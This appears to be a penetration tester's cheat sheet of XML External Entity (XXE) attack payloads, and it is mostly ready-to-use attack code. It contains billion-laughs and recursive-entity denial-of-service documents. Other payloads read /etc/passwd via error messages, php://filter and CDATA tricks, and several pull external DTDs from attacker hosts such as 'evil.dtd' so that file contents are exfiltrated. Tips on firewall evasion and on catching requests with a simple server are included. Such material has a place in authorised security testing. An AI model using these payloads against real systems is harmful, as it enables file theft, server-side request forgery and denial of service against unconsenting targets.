# Payloads:

#### Simple Example

```
<?xml version="1.0"?>
<!DOCTYPE example SYSTEM "example.dtd" [
  <!ENTITY xml "Extensible Markup Language">
]>
<example> &xml; </example>
```

#### DOS

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<?xml version="1.0"?>
<!DOCTYPE kaboom [
  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">
]>
<boom>&a;&a;&a;&a;&a;&a;&a;&a;&a;...</boom>

<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol1 "&lol2;">
  <!ENTITY lol2 "&lol1;">
]>
<lolz>&lol1;</lolz>

<?xml version="1.0" ?>
<!DOCTYPE r [
  <!ELEMENT root ANY >
  <!ENTITY external SYSTEM "file:///dev/urandom">  <!-- or /dev/random -->
]>
<root>&external;</root>
```

#### General Entity External Request Test

```
<?xml version="1.0" ?>
<!DOCTYPE r [
  <!ELEMENT root ANY >
  <!ENTITY external SYSTEM "http://x.x.x.x:443/test.txt">
]>
<root>&external;</root>
```

#### Parameter Entity External Request Test

```
# Ref: https://github.com/lsh123/xmlsec/issues/43
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % external SYSTEM "http://192.168.3.1/evil.dtd"> %external;
]>
```

### Extraction via Error Response

In the case where the web server displays an error, try to dump contents using the error response:

```
# Ref: https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 '<!ENTITY % external SYSTEM "file:///nothere/%payload;">'> %param1; %external;

# Example response
<?xml version="1.0" encoding="UTF-8"?><root>
<errors>
<errorMessage>java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
```

### PHP Exfil via base64

```
# Ref: http://www.informit.com/articles/article.aspx?p=24992&seqNum=5
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
```

### Exfil via CDATA

```
<!DOCTYPE updateProfile [
  <!ENTITY % file SYSTEM "file:///has/broken/xml">
  <!ENTITY % start "<![CDATA[" >
  <!ENTITY % end "]]>" >
  <!ENTITY % dtd SYSTEM "http://evil/join.dtd">
  %dtd;
]>
...
<lastname>&all;</lastname>

# join.dtd
<!ENTITY all "%start;%file;%end;">
```

# Caveats / Gotchas

* Sometimes servers are behind firewalls, so send requests on port 80 by default [1]
* Linefeeds & special characters get in the way, request:
  * `/etc/hostname` [1]
* Load balancers can send different responses [1]

# Useful Links:

* Simple server: `python -m SimpleHTTPServer 8080`
* Definitions:
  * [DTD Overview](http://www.informit.com/articles/article.aspx?p=24992&seqNum=5)
  * [General Entity & Parameter Entity Declarations](http://xmlwriter.net/xml_guide/entity_declaration.shtml)
  * [Attack Overview](https://www.owasp.org/images/5/58/XML_Based_Attacks_-_OWASP.pdf)
  * [Compendium of Known Techniques](https://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf) - details of platform impelementations
  * [Basic how to white paper](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf)

* Payloads:
  * [20+ DTD Cheat Sheet payloads](https://web-in-security.blogspot.ca/2016/03/xxe-cheat-sheet.html)
  * [~10 XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)

# Future Research:

* TODO:
  * dump info from this document: https://web-in-security.blogspot.ca/2016/03/xxe-cheat-sheet.html
  * Investigate: https://github.com/enjoiz/XXEinjector
* SSRF - Server Side Request Forgery
* XML Schema Poisoning
* Schema SSRF
* XPath Injection
* NDATA - how does this work?
* Modify Content-Type header: `Content-Type: application/xml`
* Notation -> http://www.informit.com/articles/article.aspx?p=24992&seqNum=5

# References

* [1](https://web-in-security.blogspot.ca/2014/11/detecting-and-exploiting-xxe-in-saml.html)
